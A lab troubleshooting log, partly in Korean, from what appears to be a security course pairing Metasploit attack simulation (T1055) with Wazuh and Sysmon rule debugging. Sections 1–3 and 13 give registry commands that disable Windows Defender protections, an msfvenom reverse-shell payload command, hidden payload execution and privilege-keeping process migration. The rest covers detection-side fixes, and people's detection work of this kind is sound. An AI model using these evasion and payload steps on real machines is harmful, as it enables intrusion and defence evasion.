# Troubleshooting — Week 6 Metasploit & T1055 + Wazuh Rule Debugging

## Index

1. [Windows Defender Auto-Recovery](#1-windows-defender-auto-recovery)
2. [Meterpreter Session Died](#2-meterpreter-session-died)
3. [Port 4444 Conflict](#3-port-4444-conflict)
4. [Sysmon Channel Duplicate in ossec.conf](#4-sysmon-channel-duplicate-in-ossecconf)
5. [ossec.conf File Corruption](#5-ossecconf-file-corruption)
6. [Wazuh Rule Permission Denied](#6-wazuh-rule-permission-denied)
7. [local_rules.xml 100042 Rule Error](#7-local_rulesxml-100042-rule-error)
8. [Wazuh 4.9.0: if_sid vs if_group Breaking Change](#8-wazuh-490-if_sid-vs-if_group-breaking-change)
9. [Wazuh Downgrade 4.9.0 → 4.7.5](#9-wazuh-downgrade-490--475)
10. [Agent Version Mismatch After Downgrade](#10-agent-version-mismatch-after-downgrade)
11. [ossec.conf Unsupported Elements in 4.7.5](#11-ossecconf-unsupported-elements-in-475)
12. [Firewall Port 1514 Not Open](#12-firewall-port-1514-not-open)
13. [migrate Drops SYSTEM Privileges](#13-migrate-drops-system-privileges)
14. [VMware Disk Full](#14-vmware-disk-full)

---

## 1. Windows Defender Auto-Recovery

**Symptom**
```
- payload.exe quarantined immediately after download or execution
- Meterpreter session closes: "Reason: Died"
- Defender settings revert after reboot even after disabling
```

**Cause**
- Tamper Protection enforced via Microsoft cloud policy
- `BehaviorMonitoring` detects in-memory Meterpreter shellcode
- `Set-MpPreference` changes are volatile — overwritten by WinDefend service

**Solution**

Step 1: Disable Tamper Protection via UI first (mandatory)
```
Windows Security → Virus & threat protection
→ Manage settings → Tamper Protection → OFF
```

Step 2: Fix via registry under Policies path (persists across reboots)
```powershell
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
New-Item -Path $path -Force
New-ItemProperty -Path $path -Name "DisableRealtimeMonitoring"  -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $path -Name "DisableBehaviorMonitoring"  -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $path -Name "DisableIOAVProtection"      -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $path -Name "DisableScriptScanning"      -Value 1 -PropertyType DWORD -Force
```

Step 3: Reboot and verify
```powershell
Restart-Computer -Force
Get-MpPreference | Select DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableIOAVProtection
# All three must be True
```

**Key Lesson**
- UI → Registry 순서 반드시 지켜야 함
- `Set-MpPreference`는 휘발성 → `Policies` 레지스트리 경로 필수
- Microsoft 계정으로 로그인 시 클라우드 정책이 덮어쓸 수 있음 → 로컬 계정으로 전환 고려

---

## 2. Meterpreter Session Died

**Symptom**
```
[*] Meterpreter session X closed. Reason: Died
```

**Cause**
- `BehaviorMonitoring` still active (see issue #1)
- Payload process terminated by Defender in-memory scan

**Solution**
1. Resolve issue #1 completely first
2. Use hidden process execution:
```powershell
Start-Process -FilePath "C:\Temp\payload.exe" -WindowStyle Hidden
```

**Key Lesson**
- 세션이 열리자마자 죽으면 Defender 문제, 연결 자체가 안 되면 방화벽/네트워크 문제

---

## 3. Port 4444 Conflict

**Symptom**
```
Handler failed to bind to 0.0.0.0:4444
```

**Cause**
- Previous listener process still holding the port

**Solution**
```bash
sudo lsof -i :4444
sudo kill -9 <PID>

# Or use different port
set LPORT 5555
# Regenerate payload with matching LPORT
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.190.130 LPORT=5555 -f exe -o /tmp/payload.exe
```

---

## 4. Sysmon Channel Duplicate in ossec.conf

**Symptom**
```
WARNING: (1958): Log file 'Microsoft-Windows-Sysmon/Operational' is duplicated
```

**Cause**
- `Microsoft-Windows-Sysmon/Operational` localfile block added twice to ossec.conf
- Wazuh agent ignores the duplicate but logs a warning

**Diagnosis**
```powershell
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.conf" | Select-String "Sysmon"
# Should show exactly 1 result
```

**Solution**
```powershell
notepad "C:\Program Files (x86)\ossec-agent\ossec.conf"
# Manually remove duplicate <localfile> block
Restart-Service WazuhSvc
# Verify
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" | Select-String "Sysmon"
# Should show INFO without WARNING
```

**Prevention**
- PowerShell로 추가할 때 기존에 있는지 먼저 확인:
```powershell
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.conf" | Select-String "Sysmon"
```

---

## 5. ossec.conf File Corruption

**Symptom**
```
Restart-Service : Failed to start 'Wazuh(WazuhSvc)'
```

**Cause**
- Accidental deletion of `<localfile>` contents during Notepad editing
- All localfile entries appear with empty tags

**Solution**
```powershell
# Restore from backup (always exists at this path)
Copy-Item "C:\Program Files (x86)\ossec-agent\ossec.conf.bak" `
  "C:\Program Files (x86)\ossec-agent\ossec.conf" -Force

# Re-add Sysmon channel safely via PowerShell
$sysmon = @"
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
"@
$conf = Get-Content "C:\Program Files (x86)\ossec-agent\ossec.conf" -Raw
$conf = $conf.Replace("</ossec_config>", "$sysmon`n</ossec_config>")
$conf | Set-Content "C:\Program Files (x86)\ossec-agent\ossec.conf" -Encoding UTF8

Restart-Service WazuhSvc
```

**Prevention**
- 편집 전 항상 수동 백업:
```powershell
Copy-Item "C:\Program Files (x86)\ossec-agent\ossec.conf" `
  "C:\Program Files (x86)\ossec-agent\ossec.conf.manual_backup"
```

---

## 6. Wazuh Rule Permission Denied

**Symptom**
```
WARNING: (1103): Could not open file 'etc/rules/local_rules.xml' due to [(13)-(Permission denied)]
```

**Cause**
- `docker cp` sets file ownership to `root:root`
- `wazuh-analysisd` runs as user `wazuh` and cannot read the file

**Solution**
```bash
docker exec single-node-wazuh.manager-1 \
  chown wazuh:wazuh /var/ossec/etc/rules/local_rules.xml

docker exec single-node-wazuh.manager-1 \
  chmod 660 /var/ossec/etc/rules/local_rules.xml

docker exec single-node-wazuh.manager-1 \
  /var/ossec/bin/wazuh-control restart
```

**Prevention**
- `docker cp` 이후에는 항상 chown/chmod 실행:
```bash
# One-liner after every docker cp
docker exec single-node-wazuh.manager-1 bash -c \
  "chown wazuh:wazuh /var/ossec/etc/rules/local_rules.xml && chmod 660 /var/ossec/etc/rules/local_rules.xml"
```

---

## 7. local_rules.xml 100042 Rule Error

**Symptom**
```
WARNING: (7615): Invalid 'if_matched_sid' value: '100005,100040,100041'. Rule '100042' will be ignored.
```

**Cause**
- `if_matched_sid` does not support comma-separated multiple SIDs
- This warning may prevent other rules from loading correctly

**Solution**
```xml
<!-- Before (invalid) -->
<rule id="100042" level="15" frequency="3" timeframe="120">
  <if_matched_sid>100005,100040,100041</if_matched_sid>
  <same_source_ip />
  <description>T1190 - Multi-vector web attack chain detected</description>
</rule>

<!-- After (valid — single SID only) -->
<rule id="100042" level="15" frequency="3" timeframe="120">
  <if_matched_sid>100005</if_matched_sid>
  <same_source_ip />
  <description>T1190 - Multi-vector web attack chain detected</description>
  <mitre><id>T1190</id></mitre>
</rule>
```

---

## 8. Wazuh 4.9.0: if_sid vs if_group Breaking Change ⭐

> 이 트러블슈팅이 가장 핵심이에요. 수십 시간의 디버깅 끝에 발견한 내용입니다.

**Symptom**
```
- Sysmon EventID 10 이벤트가 archives.json에는 수집됨
- alerts.json에는 커스텀 룰(100021)이 전혀 탐지 안 됨
- rule: None이 archives의 모든 windows_eventchannel 이벤트에 표시
- wazuh-logtest에서는 정상 매칭됨 (Alert to be generated 표시)
- 4.7.5로 다운그레이드하면 해결되는 것처럼 보임
```

**실제 원인 발견 과정**

Step 1: 4.7.5에서는 정상 작동 확인
```bash
grep "100021" /var/ossec/logs/alerts/alerts.json | wc -l
# 4.7.5: 1032 ✅
```

Step 2: 4.9.0 복귀 후 기본 Sysmon 룰(92910) 작동 확인
```bash
grep "92910" /var/ossec/logs/alerts/alerts.json | wc -l
# 4.9.0: 2454 ✅  ← 기본 룰은 작동!
```

Step 3: 92910 룰 구조 분석
```xml
<!-- 작동하는 룰 (if_group 사용) -->
<rule id="92910" level="12">
  <if_group>sysmon_event_10</if_group>
  <field name="win.eventdata.targetImage" type="pcre2">(?i)explorer\.exe</field>
</rule>

<!-- 작동 안 하는 룰 (if_sid 사용) -->
<rule id="100021" level="13">
  <if_sid>61612</if_sid>
  <field name="win.eventdata.ruleName">T1055_ProcessAccess</field>
</rule>
```

**핵심 차이: `if_sid` → `if_group`**

**Solution**
```xml
<!-- Before (broken in 4.9.0) -->
<rule id="100021" level="13">
  <if_sid>61612</if_sid>
  <field name="win.eventdata.ruleName">T1055_ProcessAccess</field>
  <description>T1055 - Suspicious process access rights</description>
  <mitre><id>T1055</id></mitre>
</rule>

<!-- After (works in 4.9.0) -->
<rule id="100021" level="13">
  <if_group>sysmon_event_10</if_group>
  <field name="win.eventdata.ruleName">T1055_ProcessAccess</field>
  <description>T1055 - Suspicious process access rights</description>
  <mitre><id>T1055</id></mitre>
</rule>
```

**Sysmon 그룹명 참조표**

| EventID | Group Name |
|---------|-----------|
| 1  | sysmon_event1 |
| 2  | sysmon_event2 |
| 3  | sysmon_event3 |
| 7  | sysmon_event7 |
| 8  | sysmon_event8 |
| 10 | sysmon_event_10 |
| 11 | sysmon_event_11 |
| 12 | sysmon_event_12 |
| 13 | sysmon_event_13 |

**Version Comparison**

| Metric | 4.7.5 (if_sid, 작동) | 4.9.0 (if_sid, 실패) | 4.9.0 (if_group, 작동) |
|--------|---------------------|---------------------|----------------------|
| rule 100021 alerts | 1,032 ✅ | 0 ❌ | 11 ✅ |
| rule 92910 alerts | - | 2,454 ✅ | 2,454 ✅ |

**Key Lesson**
- Wazuh 4.9.0에서 `windows_eventchannel` 이벤트 대상 커스텀 룰은 `if_sid` 대신 `if_group` 사용
- `wazuh-logtest`가 정상으로 보여도 실제 파이프라인에서 작동 안 할 수 있음
- 룰 디버깅 시 `logtest` 결과만 믿지 말고 `alerts.json`과 기본 룰 작동 여부를 함께 확인

---

## 9. Wazuh Downgrade 4.9.0 → 4.7.5

> if_sid 문제를 버그로 오인하여 다운그레이드를 시도한 과정

**Symptom**
- 커스텀 룰이 작동하지 않아 4.9.0 버그로 판단
- 4.7.5로 다운그레이드 시도

**Solution**
```bash
# 백업
cp ~/local_rules.xml ~/local_rules_backup.xml
cp ~/wazuh-docker/single-node/docker-compose.yml \
   ~/wazuh-docker/single-node/docker-compose.yml.bak

# 버전 변경
sed -i 's/4.9.0/4.7.5/g' ~/wazuh-docker/single-node/docker-compose.yml

# 볼륨 초기화 후 재시작
cd ~/wazuh-docker/single-node
docker compose down -v
docker compose up -d
```

**4.7.5에서 추가 작업 필요**
- `ossec.conf`에서 4.8+ 전용 설정 제거 (issue #11 참조)
- Windows agent 4.7.5로 다운그레이드 (issue #10 참조)
- 방화벽 포트 개방 (issue #12 참조)

---

## 10. Agent Version Mismatch After Downgrade

**Symptom**
```
ERROR: Agent version must be lower or equal to manager version (from manager)
```

**Cause**
- Wazuh agent (4.9.2) > Manager (4.7.5)
- Agent 버전이 Manager보다 높으면 등록 불가

**Solution**
```powershell
# Download 4.7.5 installer
Invoke-WebRequest `
  -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.5-1.msi" `
  -OutFile "C:\Temp\wazuh-agent-4.7.5.msi"

# Install silently with Manager address
msiexec /i "C:\Temp\wazuh-agent-4.7.5.msi" /q WAZUH_MANAGER="192.168.190.128"

# Register and start
& "C:\Program Files (x86)\ossec-agent\agent-auth.exe" -m 192.168.190.128
Start-Service WazuhSvc
```

**Verify on Manager**
```bash
docker exec single-node-wazuh.manager-1 /var/ossec/bin/agent_control -l
# Should show: ID: 001, Name: DESKTOP-5408CBA, IP: any, Active
```

---

## 11. ossec.conf Unsupported Elements in 4.7.5

**Symptom**
```
ERROR: (1230): Invalid element in the configuration: 'vulnerability-detection'
ERROR: (1230): Invalid element in the configuration: 'indexer'
wazuh-authd: Configuration error. Exiting
```

**Cause**
- `vulnerability-detection` 블록: Wazuh 4.8+ 전용
- `indexer` 블록: Wazuh 4.8+ 전용
- 4.9.0 → 4.7.5 다운그레이드 시 ossec.conf에 그대로 남아있음

**Solution**
```bash
# Find line numbers
docker exec single-node-wazuh.manager-1 \
  grep -n "vulnerability-detection\|<indexer>" /var/ossec/etc/ossec.conf

# Remove blocks (adjust line numbers accordingly)
docker exec single-node-wazuh.manager-1 \
  sed -i '<start_line>,<end_line>d' /var/ossec/etc/ossec.conf

# Restart
docker exec single-node-wazuh.manager-1 \
  /var/ossec/bin/wazuh-control restart
```

---

## 12. Firewall Port 1514 Not Open

**Symptom**
- Windows agent status: `Disconnected` or `Never connected`
- No connection logs in `ossec.log`
- Rocky Linux: `ss -tlnp | grep 1514` returns empty

**Cause**
- 방화벽에서 1514 포트가 닫혀있음
- Docker 볼륨 초기화 후 방화벽 설정이 리셋됨

**Solution**
```bash
sudo firewall-cmd --permanent --add-port=1514/tcp
sudo firewall-cmd --permanent --add-port=1514/udp
sudo firewall-cmd --reload

# Verify
sudo firewall-cmd --list-ports | grep 1514
# Should show: 1514/tcp 1514/udp
```

---

## 13. migrate Drops SYSTEM Privileges

**Symptom**
- `getsystem` 성공 후 `migrate explorer.exe` 하면 권한이 일반 사용자로 낮아짐

**Cause**
- 정상 동작: `explorer.exe`는 로그인한 사용자 권한으로 실행됨
- SYSTEM 권한 프로세스로 migrate해야 SYSTEM 유지 가능

**Solution**
```bash
# SYSTEM 권한 svchost.exe로 migrate
ps | grep svchost
# x64, Session 0, SYSTEM 권한인 PID 선택
migrate <svchost_PID>
```

**Key Lesson**
- `explorer.exe` migrate = 스텔스 목적 (탐지 회피)
- SYSTEM 권한 유지 목적 = `svchost.exe` (Session 0) migrate

---

## 14. VMware Disk Full

**Symptom**
```
VMware: The file system where disk resides is full.
Rocky Linux VM이 강제 종료됨
터미널 접근 불가
```

**Cause**
- Wazuh 4.9.0 Docker 이미지 다운로드 중 호스트 D 드라이브 공간 부족
- Windows VM의 `.vmem` 파일(메모리 스냅샷)이 4GB 차지

**Solution**

Step 1: VMware 팝업에서 Cancel 클릭

Step 2: Windows VM 종료 (`.vmem` 파일 자동 삭제됨 — 약 4GB 확보)

Step 3: Docker 이미지 정리 (Rocky Linux에서)
```bash
docker system prune -a --volumes -f
# Reclaimed: ~2GB (구버전 Wazuh 이미지)
```

Step 4: 공간 확인 후 재시작
```bash
df -h
cd ~/wazuh-docker/single-node
docker compose up -d
```

**Key Lesson**
- Wazuh Docker 이미지 하나당 약 1-2GB
- `.vmem` 파일은 VM 실행 중에만 생성됨 → VM 종료 시 자동 삭제
- 실습 환경 디스크는 최소 50GB 여유 권장

---

## Summary Table

| # | Issue | Root Cause | Fix | Time Cost |
|---|-------|-----------|-----|-----------|
| 1 | Defender auto-recovery | Cloud policy + volatile settings | Registry Policies path | 중 |
| 2 | Session Died | BehaviorMonitoring | Fix #1 first | 낮 |
| 3 | Port conflict | Old listener | kill PID | 낮 |
| 4 | Sysmon channel duplicate | Added twice | Remove duplicate | 낮 |
| 5 | ossec.conf corruption | Accidental deletion | Restore .bak | 낮 |
| 6 | Rule Permission Denied | docker cp sets root:root | chown wazuh:wazuh | 낮 |
| 7 | 100042 rule ignored | Multiple SIDs in if_matched_sid | Single SID only | 낮 |
| **8** | **if_sid not working (4.9.0)** | **if_sid→if_group change** | **Use if_group** | **매우 높음** |
| 9 | Downgrade side effects | Version incompatibility | Multiple fixes | 높 |
| 10 | Agent version mismatch | Agent > Manager version | Install matching agent | 중 |
| 11 | ossec.conf invalid elements | 4.8+ only blocks | Remove unsupported blocks | 중 |
| 12 | Firewall port closed | Port not opened | firewall-cmd | 낮 |
| 13 | SYSTEM lost after migrate | explorer.exe is user-context | svchost.exe instead | 낮 |
| 14 | VMware disk full | Docker image download | prune + .vmem cleanup | 중 |
